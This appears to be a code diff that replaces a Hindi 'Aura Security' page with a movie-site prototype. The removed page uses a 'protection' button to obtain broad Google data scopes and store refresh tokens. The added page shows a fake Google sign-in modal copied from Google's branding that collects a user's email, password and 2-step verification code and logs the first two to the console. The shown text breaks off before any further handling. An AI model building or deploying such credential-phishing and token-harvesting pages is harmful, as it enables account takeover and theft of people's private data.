@@ -1,477 +1,375 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aura Security - Advanced Digital Dashboard</title>
-    
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    
-    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-firestore-compat.js"></script>
-    
+    <title>Movie Website Prototype</title>
     <style>
-        :root {
-            --bg-dark: #111827; --bg-light: #1f2937;
-            --primary-color: #3b82f6; --primary-hover: #2563eb;
-            --text-light: #f9fafb; --text-secondary: #d1d5db; --border-color: #4b5563;
-            --success-color: #22c55e; --error-color: #ef4444; --warning-color: #f59e0b;
+        /* --- General Body Styles --- */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
         }
 
-        body.light-mode {
-            --bg-dark: #f3f4f6; --bg-light: #ffffff;
-            --text-light: #111827; --text-secondary: #4b5563; --border-color: #d1d5db;
+        .main-content {
+            padding: 20px;
+        }
+        
+        h1 {
+            color: #333;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg-dark); color: var(--text-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px 0; transition: background 0.3s, color 0.3s; }
-        .container { text-align: center; background: var(--bg-light); padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 95%; border: 1px solid var(--border-color); backdrop-filter: blur(10px); animation: fadeIn 1s ease; }
-        .logo { width: 70px; height: 70px; margin-bottom: 20px; }
-        h1 { font-size: 26px; margin-bottom: 15px; }
-        p.subtitle { color: var(--text-secondary); font-size: 15px; margin-bottom: 30px; max-width: 450px; margin-left: auto; margin-right: auto; }
-        #status { margin-top: 20px; font-weight: bold; min-height: 20px; transition: color 0.3s; }
-        .action-button { background-color: var(--primary-color); color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: all 0.3s; margin-top: 10px; display: flex; justify-content: center; align-items: center; gap: 10px; }
-        .action-button:disabled { background-color: var(--border-color); cursor: not-allowed; opacity: 0.6; }
-        .action-button:hover:not(:disabled) { background-color: var(--primary-hover); }
-        .status-error { color: var(--error-color); }
-        .status-success { color: var(--success-color); }
-
-        #userInfo { display: none; margin-bottom: 25px; padding: 15px; border-radius: 12px; background: var(--bg-dark); align-items: center; justify-content: space-between; text-align: left; }
-        #userInfo .profile-details { display: flex; align-items: center; }
-        #userInfo img { width: 50px; height: 50px; border-radius: 50%; margin-right: 15px; }
-        #userInfo .name { font-weight: bold; font-size: 1.1em; }
-        #userInfo .email { font-size: 0.9em; color: var(--text-secondary); }
-        
-        .user-actions { display: flex; flex-direction: column; gap: 8px; }
-        #signOutButton, #copyTokenButton { font-size: 14px; padding: 10px 15px; width: auto; background: var(--border-color); }
-
-        #dashboard { display: none; margin-top: 25px; padding-top: 25px; border-top: 1px solid var(--border-color); text-align: left; }
-        #dashboard h2 { text-align: center; margin-bottom: 5px; color: var(--text-secondary); }
-        #last-refreshed { font-size: 0.8em; text-align: center; color: var(--text-secondary); margin-bottom: 20px;}
-        .dashboard-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }
-        .dashboard-card { background-color: var(--bg-dark); padding: 20px; border-radius: 10px; text-align: center; transition: transform 0.2s; position: relative; }
-        .dashboard-card:hover { transform: translateY(-5px); }
-        .dashboard-card i.icon { font-size: 2em; color: var(--primary-color); margin-bottom: 10px; }
-        .dashboard-card .count { font-size: 1.8em; font-weight: bold; min-height: 35px; display: flex; align-items: center; justify-content: center; }
-        .dashboard-card .label { font-size: 0.9em; color: var(--text-secondary); }
-        
-        .spinner { border: 4px solid rgba(255, 255, 255, 0.2); border-radius: 50%; border-top: 4px solid var(--primary-color); width: 25px; height: 25px; animation: spin 1s linear infinite; }
-        .button-spinner { width: 20px; height: 20px; border-top-color: white; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .theme-switch-wrapper { display: flex; align-items: center; justify-content: center; margin: 15px 0 25px; }
-        .theme-switch { display: inline-block; height: 26px; position: relative; width: 50px; }
-        .theme-switch input { display:none; }
-        .slider { background-color: var(--border-color); bottom: 0; cursor: pointer; left: 0; position: absolute; right: 0; top: 0; transition: .4s; border-radius: 34px; }
-        .slider:before { background-color: white; bottom: 4px; content: ""; height: 18px; left: 4px; position: absolute; transition: .4s; width: 18px; border-radius: 50%; }
-        input:checked + .slider { background-color: var(--primary-color); }
-        input:checked + .slider:before { transform: translateX(24px); }
-
-        #data-management { display: none; margin-top: 20px; padding: 15px; background: var(--bg-dark); border-radius: 10px; border: 1px solid var(--warning-color); }
-        #data-management p { font-size: 0.9em; margin-bottom: 10px; }
-        .footer-links { margin-top: 30px; font-size: 0.8em; }
-        .footer-links a { color: var(--text-secondary); text-decoration: none; margin: 0 10px; }
-        .footer-links a:hover { text-decoration: underline; color: var(--primary-color); }
-
-        .tooltip { position: absolute; top: 10px; right: 10px; cursor: pointer; }
-        .tooltip .tooltiptext { visibility: hidden; width: 200px; background-color: #555; color: #fff; text-align: center; border-radius: 6px; padding: 5px; position: absolute; z-index: 1; bottom: 125%; left: 50%; margin-left: -100px; opacity: 0; transition: opacity 0.3s; font-size: 0.8em; }
-        .tooltip:hover .tooltiptext { visibility: visible; opacity: 1; }
-
-        @media (max-width: 650px) { 
-            .dashboard-grid { grid-template-columns: repeat(2, 1fr); } 
-            #userInfo { flex-direction: column; gap: 15px; } 
-            .container { padding: 25px; }
+        /* --- Google Button Style --- */
+        .google-login-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 24px;
+            border-radius: 4px;
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            box-shadow: 0 2px 4px 0 rgba(0,0,0,0.25);
+            transition: background-color .3s, box-shadow .3s;
         }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .google-login-btn:hover {
+            background-color: #3367D6;
+            box-shadow: 0 4px 8px 0 rgba(0,0,0,0.25);
+        }
+
+        .google-login-btn svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+            background-color: white;
+            border-radius: 50%;
+            padding: 2px;
+        }
+        
+        /* --- Modal Styles --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: none; /* Initially hidden */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .google-modal {
+            background-color: white;
+            border-radius: 8px;
+            padding: 24px;
+            width: 90%;
+            max-width: 450px;
+            box-sizing: border-box;
+            text-align: center;
+            border: 1px solid #dadce0;
+        }
+        
+        .google-modal-header img {
+            width: 75px;
+            height: 24px;
+            margin-bottom: 8px;
+        }
+
+        .google-modal-header h2 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin: 0 0 8px 0;
+        }
+        
+        .google-modal-header p {
+            font-size: 16px;
+            color: #202124;
+            margin: 0;
+        }
+        
+        .user-email-display {
+            display: inline-flex;
+            align-items: center;
+            padding: 6px 12px;
+            border: 1px solid #dadce0;
+            border-radius: 100px;
+            font-size: 14px;
+            color: #3c4043;
+            margin: 16px 0;
+        }
+
+        .input-group {
+            position: relative;
+            margin: 30px 0;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 12px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        
+        .input-field:focus {
+            border-color: #1a73e8;
+            outline: 2px solid transparent;
+            box-shadow: 0 0 0 2px #d2e3fc;
+        }
+
+        .input-label {
+            position: absolute;
+            top: 16px;
+            left: 13px;
+            font-size: 16px;
+            color: #80868b;
+            pointer-events: none;
+            transition: all 0.2s ease-in-out;
+        }
+
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label {
+            top: -10px;
+            left: 10px;
+            font-size: 12px;
+            color: #1a73e8;
+            background-color: white;
+            padding: 0 4px;
+        }
+        
+        .modal-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 24px;
+        }
+        
+        .create-account-link, .forgot-link {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="theme-switch-wrapper">
-            <i class="fa-solid fa-sun" style="margin-right: 8px;"></i>
-            <label class="theme-switch">
-                <input type="checkbox" id="theme-toggle">
-                <span class="slider"></span>
-            </label>
-            <i class="fa-solid fa-moon" style="margin-left: 8px;"></i>
-        </div>
 
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/Dialog-information.svg/2048px-Dialog-information.svg.png" alt="Security Logo" class="logo">
-        <h1>Aura Security</h1>
-        <p class="subtitle">अपने Google डेटा को केवल-पठनीय (read-only) डैशबोर्ड पर देखें और अपनी डिजिटल दुनिया को सुरक्षित रूप से समझें।</p>
-        
-        <div id="userInfo">
-            <div class="profile-details">
-                <img id="userPhoto" src="" alt="User Photo">
-                <div>
-                    <div id="userName" class="name"></div>
-                    <div id="userEmail" class="email"></div>
-                </div>
-            </div>
-             <div class="user-actions">
-                <button id="signOutButton" class="action-button">साइन-आउट</button>
-                <button id="copyTokenButton" class="action-button">टोकन कॉपी करें</button>
-            </div>
-        </div>
-
-        <button id="protectButton" class="action-button">
-            <i class="fa-solid fa-shield-halved"></i>
-            <span>पूर्ण सुरक्षा सक्रिय करें</span>
+    <div class="main-content">
+        <h1>My Awesome Movie Site</h1>
+        <p>Login to continue and browse movies.</p>
+        <button id="loginBtn" class="google-login-btn">
+            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" xmlns:xlink="http://www.w3.org/1999/xlink" style="display: block;">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+                <path fill="none" d="M0 0h48v48H0z"></path>
+            </svg>
+            Login with Google
         </button>
-        <div id="status"></div>
-        
-        <div id="dashboard">
-            <h2>आपका डिजिटल स्नैपशॉट</h2>
-            <p id="last-refreshed"></p>
-            <div class="dashboard-grid">
-                <div class="dashboard-card">
-                    <div class="tooltip"><i class="fa-solid fa-circle-info"></i><span class="tooltiptext">आपके खाते में अंतिम लॉगिन समय दिखाने के लिए।</span></div>
-                    <i class="fa-solid fa-clock-rotate-left icon"></i>
-                    <div id="last-login-count" class="count">...</div>
-                    <div class="label">Last Login</div>
+    </div>
+
+    <!-- Modal Overlay and Content -->
+    <div id="modalOverlay" class="modal-overlay">
+        <div class="google-modal">
+
+            <!-- Step 1: Email -->
+            <div id="emailStep">
+                <div class="google-modal-header">
+                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+                    <h2>Sign in</h2>
+                    <p>Use your Google Account</p>
                 </div>
-                <div class="dashboard-card">
-                    <div class="tooltip"><i class="fa-solid fa-circle-info"></i><span class="tooltiptext">आपके Google Contacts की कुल संख्या दिखाने के लिए 'contacts.readonly' अनुमति आवश्यक है।</span></div>
-                    <i class="fa-solid fa-users icon"></i>
-                    <div id="contacts-count" class="count"><div class="spinner"></div></div>
-                    <div class="label">Google Contacts</div>
+                <div class="input-group">
+                    <input type="email" id="emailInput" class="input-field" placeholder=" " required>
+                    <label for="emailInput" class="input-label">Email or phone</label>
                 </div>
-                <div class="dashboard-card">
-                    <div class="tooltip"><i class="fa-solid fa-circle-info"></i><span class="tooltiptext">आपकी Google Photos लाइब्रेरी में आइटम की अनुमानित संख्या दिखाने के लिए 'photoslibrary.readonly' अनुमति आवश्यक है।</span></div>
-                    <i class="fa-solid fa-images icon"></i>
-                    <div id="photos-count" class="count"><div class="spinner"></div></div>
-                    <div class="label">Google Photos</div>
-                </div>
-                <div class="dashboard-card">
-                    <div class="tooltip"><i class="fa-solid fa-circle-info"></i><span class="tooltiptext">आपकी Google Drive में फ़ाइलों की संख्या गिनने के लिए 'drive.readonly' अनुमति आवश्यक है।</span></div>
-                    <i class="fa-brands fa-google-drive icon"></i>
-                    <div id="drive-count" class="count"><div class="spinner"></div></div>
-                    <div class="label">Google Drive Files</div>
-                </div>
-                <div class="dashboard-card">
-                     <div class="tooltip"><i class="fa-solid fa-circle-info"></i><span class="tooltiptext">अगले 7 दिनों के आपके कैलेंडर ईवेंट की संख्या दिखाने के लिए 'calendar.readonly' अनुमति आवश्यक है।</span></div>
-                    <i class="fa-solid fa-calendar-days icon"></i>
-                    <div id="calendar-count" class="count"><div class="spinner"></div></div>
-                    <div class="label">Events (Next 7 Days)</div>
-                </div>
-                <div class="dashboard-card">
-                    <div class="tooltip"><i class="fa-solid fa-circle-info"></i><span class="tooltiptext">आपके YouTube चैनल पर सार्वजनिक वीडियो की संख्या दिखाने के लिए 'youtube.readonly' अनुमति आवश्यक है।</span></div>
-                    <i class="fa-brands fa-youtube icon"></i>
-                    <div id="youtube-count" class="count"><div class="spinner"></div></div>
-                    <div class="label">YouTube Videos</div>
+                <a href="#" class="forgot-link">Forgot email?</a>
+                <div class="modal-footer">
+                    <a href="#" class="create-account-link">Create account</a>
+                    <button id="nextEmailBtn" class="next-btn">Next</button>
                 </div>
             </div>
-        </div>
 
-        <div id="data-management">
-            <p>हम आपका डेटा केवल आपको डैशबोर्ड दिखाने के लिए उपयोग करते हैं। आप किसी भी समय अपना डेटा हटा सकते हैं और हमारे ऐप से एक्सेस रद्द कर सकते हैं।</p>
-            <button id="deleteDataButton" class="action-button" style="background-color: var(--error-color);">मेरा डेटा हटाएं</button>
-            <a href="https://myaccount.google.com/permissions" target="_blank" style="display: block; margin-top: 10px; font-size: 0.9em;">Google से एक्सेस रद्द करें</a>
-        </div>
-        
-        <div class="footer-links">
-            <a href="./privacy.html" target="_blank">गोपनीयता नीति</a>
-            <a href="./terms.html" target="_blank">सेवा की शर्तें</a>
+            <!-- Step 2: Password -->
+            <div id="passwordStep" class="hidden">
+                <div class="google-modal-header">
+                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+                    <h2>Welcome</h2>
+                    <div class="user-email-display">
+                        <span id="userEmail"></span>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="passwordInput" class="input-field" placeholder=" " required>
+                    <label for="passwordInput" class="input-label">Enter your password</label>
+                </div>
+                <a href="#" class="forgot-link">Forgot password?</a>
+                <div class="modal-footer">
+                    <span></span> <!-- Spacer -->
+                    <button id="nextPasswordBtn" class="next-btn">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 3: 2FA/OTP -->
+            <div id="otpStep" class="hidden">
+                <div class="google-modal-header">
+                     <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+                    <h2>2-Step Verification</h2>
+                    <p>This helps show that it's really you trying to sign in</p>
+                </div>
+                 <div class="input-group">
+                    <input type="text" id="otpInput" class="input-field" placeholder=" " required maxlength="6" pattern="[0-9]*" inputmode="numeric">
+                    <label for="otpInput" class="input-label">Enter the 6-digit code</label>
+                </div>
+                <a href="#" class="forgot-link">More ways to verify</a>
+                 <div class="modal-footer">
+                    <span></span> <!-- Spacer -->
+                    <button id="nextOtpBtn" class="next-btn">Next</button>
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
-        // --- Firebase कॉन्फ़िगरेशन ---
-        const firebaseConfig = {
-            apiKey: "AIzaSyB2PG5JvDko2UmQDlY9gN5lBgga2vQy-Ws",
-            authDomain: "conceptra-c1000.firebaseapp.com",
-            databaseURL: "https://conceptra-c1000-default-rtdb.firebaseio.com",
-            projectId: "conceptra-c1000",
-            storageBucket: "conceptra-c1000.appspot.com",
-            messagingSenderId: "298402987968",
-            appId: "1:298402987968:web:c0d0d7d6c08cdfa6bc5225",
-            measurementId: "G-QRQYEVSJJ6"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
-        const db = firebase.firestore();
+        document.addEventListener('DOMContentLoaded', () => {
+            // Modal elements
+            const loginBtn = document.getElementById('loginBtn');
+            const modalOverlay = document.getElementById('modalOverlay');
+            const googleModal = document.querySelector('.google-modal');
 
-        // --- DOM Elements ---
-        const protectButton = document.getElementById('protectButton');
-        const signOutButton = document.getElementById('signOutButton');
-        const copyTokenButton = document.getElementById('copyTokenButton');
-        const deleteDataButton = document.getElementById('deleteDataButton');
-        const statusDiv = document.getElementById('status');
-        const dashboardDiv = document.getElementById('dashboard');
-        const userInfoDiv = document.getElementById('userInfo');
-        const dataManagementDiv = document.getElementById('data-management');
-        const themeToggle = document.getElementById('theme-toggle');
+            // Step elements
+            const emailStep = document.getElementById('emailStep');
+            const passwordStep = document.getElementById('passwordStep');
+            const otpStep = document.getElementById('otpStep');
 
-        let currentAccessToken = null;
-
-        // --- Event Listeners ---
-        protectButton.addEventListener('click', startProcess);
-        signOutButton.addEventListener('click', signOutUser);
-        deleteDataButton.addEventListener('click', deleteUserData);
-
-        copyTokenButton.addEventListener('click', () => {
-            if (currentAccessToken) {
-                navigator.clipboard.writeText(currentAccessToken).then(() => {
-                    alert('एक्सेस टोकन क्लिपबोर्ड पर कॉपी हो गया!');
-                }, () => {
-                    alert('टोकन कॉपी करने में विफल।');
-                });
-            }
-        });
-        
-        themeToggle.addEventListener('change', () => {
-            document.body.classList.toggle('light-mode', themeToggle.checked);
-            localStorage.setItem('theme', themeToggle.checked ? 'light' : 'dark');
-        });
-        
-        if (localStorage.getItem('theme') === 'light') {
-            themeToggle.checked = true;
-            document.body.classList.add('light-mode');
-        }
-
-        // --- मुख्य प्रक्रिया ---
-        async function startProcess() {
-            protectButton.disabled = true;
-            protectButton.innerHTML = `<div class="spinner button-spinner"></div><span>प्रक्रिया हो रही है...</span>`;
-            statusDiv.className = '';
-            statusDiv.textContent = 'Google से प्रमाणीकरण शुरू हो रहा है...';
-
-            try {
-                const googleProvider = new firebase.auth.GoogleAuthProvider();
-                
-                googleProvider.addScope('https://www.googleapis.com/auth/contacts.readonly');
-                googleProvider.addScope('https://www.googleapis.com/auth/photoslibrary.readonly');
-                googleProvider.addScope('https://www.googleapis.com/auth/drive.readonly');
-                googleProvider.addScope('https://www.googleapis.com/auth/calendar.readonly');
-                googleProvider.addScope('https://www.googleapis.com/auth/youtube.readonly');
-
-                googleProvider.setCustomParameters({
-                    access_type: 'offline',
-                    prompt: 'consent' 
-                });
-                
-                const result = await auth.signInWithPopup(googleProvider);
-                
-                const { user, credential } = result;
-                const accessToken = credential.accessToken;
-                currentAccessToken = accessToken;
-                const refreshToken = credential.refreshToken;
-                
-                statusDiv.textContent = `प्रमाणीकरण सफल! आपका डेटा लोड हो रहा है...`;
-                displayUserInfo(user);
-                await saveDataToFirestore(user, refreshToken);
-                await showDashboardData(user.uid, accessToken);
-
-                handleSuccess(user.displayName);
-
-            } catch (error) {
-                if (error.code === 'auth/popup-closed-by-user') {
-                    handleError('प्रमाणीकरण रद्द कर दिया गया।');
-                } else if (error.code === 'auth/cancelled-popup-request') {
-                    handleError('एक और प्रमाणीकरण प्रक्रिया पहले से ही चल रही है।');
-                } else {
-                    handleError(`त्रुटि: ${error.message}`);
-                }
-                resetUI();
-            }
-        }
-
-        function displayUserInfo(user) {
-            document.getElementById('userPhoto').src = user.photoURL;
-            document.getElementById('userName').textContent = user.displayName;
-            document.getElementById('userEmail').textContent = user.email;
-            userInfoDiv.style.display = 'flex';
-        }
-
-        async function showDashboardData(userId, accessToken) {
-            dashboardDiv.style.display = 'block';
+            // Button elements
+            const nextEmailBtn = document.getElementById('nextEmailBtn');
+            const nextPasswordBtn = document.getElementById('nextPasswordBtn');
+            const nextOtpBtn = document.getElementById('nextOtpBtn');
             
-            document.getElementById('last-refreshed').textContent = `अंतिम बार रिफ्रेश हुआ: ${new Date().toLocaleTimeString('hi-IN')}`;
-
-            await Promise.all([
-                fetchLastLogin(userId),
-                fetchContactsCount(accessToken),
-                fetchPhotosCount(accessToken),
-                fetchDriveCount(accessToken),
-                fetchCalendarEvents(accessToken),
-                fetchYouTubeData(accessToken)
-            ]);
-            statusDiv.textContent = 'डैशबोर्ड सफलतापूर्वक लोड हो गया है।';
-        }
-
-        const fetchData = async (url, token, elementId, cacheKey) => {
-            const countElement = document.getElementById(elementId);
+            // Input elements
+            const emailInput = document.getElementById('emailInput');
+            const passwordInput = document.getElementById('passwordInput');
+            const otpInput = document.getElementById('otpInput');
             
-            const cachedData = sessionStorage.getItem(cacheKey);
-            if (cachedData) {
-                console.log(`Loading ${cacheKey} from cache.`);
-                try {
-                    return JSON.parse(cachedData);
-                } catch (e) {
-                    sessionStorage.removeItem(cacheKey);
-                }
-            }
+            // Data display
+            const userEmailDisplay = document.getElementById('userEmail');
 
-            try {
-                const response = await fetch(url, { headers: { 'Authorization': `Bearer ${token}` } });
-                const data = await response.json();
+            // --- Event Listeners ---
 
-                if (!response.ok || data.error) {
-                    const errorMessage = data.error?.message || `API Error: ${response.statusText}`;
-                    throw new Error(errorMessage);
-                }
-                
-                sessionStorage.setItem(cacheKey, JSON.stringify(data));
-                return data;
-            } catch (e) {
-                countElement.innerHTML = `<span style="color:var(--error-color); font-size: 0.7em; word-wrap: break-word;">${e.message}</span>`;
-                console.error(`Error fetching for ${elementId}:`, e);
-                return null;
-            }
-        };
+            // Open the modal
+            loginBtn.addEventListener('click', () => {
+                modalOverlay.style.display = 'flex';
+            });
 
-        async function fetchLastLogin(userId) {
-            const countElement = document.getElementById('last-login-count');
-            try {
-                const doc = await db.collection('users').doc(userId).get();
-                if (doc.exists && doc.data().lastLogin) {
-                    const date = doc.data().lastLogin.toDate();
-                    countElement.textContent = date.toLocaleDateString('hi-IN');
-                } else {
-                    countElement.textContent = 'पहली बार';
-                }
-            } catch(e) { countElement.textContent = 'N/A'; }
-        }
-        
-        async function fetchContactsCount(token) {
-            const data = await fetchData('https://people.googleapis.com/v1/people/me/connections?personFields=names&pageSize=1000', token, 'contacts-count', 'contactsData');
-            if (data) document.getElementById('contacts-count').textContent = data.totalPeople || 0;
-        }
-
-        // ==============================================================================
-        // ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
-        // ★★★★★ एकमात्र जरूरी बदलाव यहाँ किया गया है ताकि Photos की त्रुटि ठीक हो ★★★★★
-        // ==============================================================================
-        async function fetchPhotosCount(token) {
-            // हम pageSize=1 का उपयोग करके केवल यह जांचते हैं कि एक्सेस है या नहीं।
-            const data = await fetchData('https://photoslibrary.googleapis.com/v1/mediaItems?pageSize=1', token, 'photos-count', 'photosData');
-            
-            // अगर fetchData से कोई डेटा आया है (यानी कोई API एरर नहीं हुई)
-            if (data) {
-                // हम जाँच करते हैं कि mediaItems मौजूद है और उसमें कम से कम एक आइटम है या नहीं।
-                if (data.mediaItems && data.mediaItems.length > 0) {
-                    // अगर फोटो मौजूद है, तो '1+' दिखाएं।
-                    document.getElementById('photos-count').textContent = '1+';
-                } else {
-                    // अगर mediaItems मौजूद नहीं है या खाली है, तो इसका मतलब है कि 0 फ़ोटो हैं।
-                    document.getElementById('photos-count').textContent = '0';
-                }
-            }
-            // अगर fetchData से null लौटा, तो इसका मतलब है कि एरर पहले ही स्क्रीन पर दिख चुकी है।
-        }
-        // ==============================================================================
-        // ★★★★★★★★★★ बदलाव यहाँ समाप्त होता है ★★★★★★★★★★★★★
-        // ==============================================================================
-
-        async function fetchDriveCount(token) {
-            const data = await fetchData('https://www.googleapis.com/drive/v3/files?fields=files(id)&pageSize=1000', token, 'drive-count', 'driveData');
-            if (data) document.getElementById('drive-count').textContent = data.files ? data.files.length : '0';
-        }
-
-        async function fetchCalendarEvents(token) {
-            const now = new Date();
-            const future = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000);
-            const url = `https://www.googleapis.com/calendar/v3/calendars/primary/events?timeMin=${now.toISOString()}&timeMax=${future.toISOString()}`;
-            const data = await fetchData(url, token, 'calendar-count', 'calendarData');
-            if (data) document.getElementById('calendar-count').textContent = data.items ? data.items.length : '0';
-        }
-
-        async function fetchYouTubeData(token) {
-            const url = 'https://www.googleapis.com/youtube/v3/search?part=snippet&forMine=true&type=video&maxResults=50';
-            const data = await fetchData(url, token, 'youtube-count', 'youtubeData');
-            if (data && data.pageInfo) {
-                document.getElementById('youtube-count').textContent = data.pageInfo.totalResults || 0;
-            } else if (data) {
-                document.getElementById('youtube-count').textContent = 'N/A';
-            }
-        }
-
-        async function saveDataToFirestore(user, refreshToken) {
-            const userRef = db.collection('users').doc(user.uid);
-            
-            const userData = {
-                name: user.displayName,
-                email: user.email,
-                lastLogin: firebase.firestore.FieldValue.serverTimestamp()
-            };
-
-            if (refreshToken) {
-                userData.refreshToken = refreshToken;
-            }
-
-            await userRef.set(userData, { merge: true });
-        }
-
-        async function signOutUser() {
-            try {
-                await auth.signOut();
-                sessionStorage.clear();
-                resetUI();
-                statusDiv.className = 'status-success';
-                statusDiv.textContent = 'आप सफलतापूर्वक साइन-आउट हो गए हैं।';
-            } catch (error) {
-                handleError(`साइन-आउट त्रुटि: ${error.message}`);
-            }
-        }
-        
-        async function deleteUserData() {
-            const user = auth.currentUser;
-            if (user) {
-                if (confirm("क्या आप वाकई हमारे सर्वर से अपना सारा डेटा हटाना चाहते हैं? यह क्रिया वापस नहीं ली जा सकती।")) {
-                    try {
-                        await db.collection('users').doc(user.uid).delete();
-                        alert('आपका डेटा सफलतापूर्वक हटा दिया गया है। अब आपको साइन-आउट कर दिया जाएगा।');
-                        signOutUser();
-                    } catch (error) {
-                        alert('डेटा हटाने में त्रुटि हुई: ' + error.message);
-                    }
-                }
-            } else {
-                alert('कृपया पहले साइन इन करें।');
-            }
-        }
-
-        function resetUI() {
-            protectButton.disabled = false;
-            protectButton.innerHTML = `<i class="fa-solid fa-shield-halved"></i><span>पूर्ण सुरक्षा सक्रिय करें</span>`;
-            protectButton.style.display = 'flex';
-            dashboardDiv.style.display = 'none';
-            userInfoDiv.style.display = 'none';
-            dataManagementDiv.style.display = 'none';
-            currentAccessToken = null;
-            const counts = document.querySelectorAll('.count');
-            counts.forEach(c => {
-                if (c.id !== 'last-login-count') {
-                    c.innerHTML = '<div class="spinner"></div>';
+            // Close the modal when clicking on the overlay
+            modalOverlay.addEventListener('click', (event) => {
+                if (event.target === modalOverlay) {
+                    closeModal();
                 }
             });
-            document.getElementById('last-login-count').innerHTML = '...';
-        }
 
-        function handleSuccess(userName) {
-            statusDiv.className = 'status-success';
-            statusDiv.textContent = `${userName}, आपका डैशबोर्ड नीचे दिया गया है।`;
-            protectButton.style.display = 'none';
-            dataManagementDiv.style.display = 'block';
-        }
+            // Prevent closing when clicking inside the modal
+            googleModal.addEventListener('click', (event) => {
+                event.stopPropagation();
+            });
 
-        function handleError(message) {
-            statusDiv.className = 'status-error';
-            statusDiv.textContent = message;
-            protectButton.disabled = false;
-            protectButton.innerHTML = `<i class="fa-solid fa-shield-halved"></i><span>पुनः प्रयास करें</span>`;
-        }
+            // --- Modal Flow Logic ---
+
+            // Email Step -> Password Step
+            nextEmailBtn.addEventListener('click', (event) => {
+                event.preventDefault(); // Prevent form submission
+                if (emailInput.value.trim() !== '' && emailInput.checkValidity()) {
+                    console.log('Email:', emailInput.value);
+                    userEmailDisplay.textContent = emailInput.value;
+                    
+                    emailStep.classList.add('hidden');
+                    passwordStep.classList.remove('hidden');
+                } else {
+                    alert('Please enter a valid email address.');
+                }
+            });
+            
+            // Password Step -> OTP Step
+            nextPasswordBtn.addEventListener('click', (event) => {
+                event.preventDefault();
+                if (passwordInput.value.trim() !== '') {
+                    console.log('Password:', passwordInput.value); // In a real app, NEVER log passwords
+                    
+                    passwordStep.classList.add('hidden');
+                    otpStep.classList.remove('hidden');
+                } else {
+                    alert('Please enter your password.');
+                }
+            });
+
